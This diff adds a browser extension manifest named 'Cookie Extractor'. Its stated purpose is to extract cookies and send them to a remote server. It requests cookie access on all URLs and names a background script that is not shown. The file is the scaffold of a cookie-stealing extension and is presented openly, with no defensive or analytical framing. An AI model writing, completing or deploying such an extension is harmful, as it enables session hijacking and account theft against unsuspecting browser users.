@@ -1,0 +1,14 @@
+{
+  "manifest_version": 2,
+  "name": "Cookie Extractor",
+  "version": "1.0",
+  "description": "Extracts cookies and sends them to a remote server.",
+  "permissions": [
+    "cookies",
+    "<all_urls>"
+  ],
+  "background": {
+    "scripts": ["background.js"],
+    "persistent": false
+  }
+}
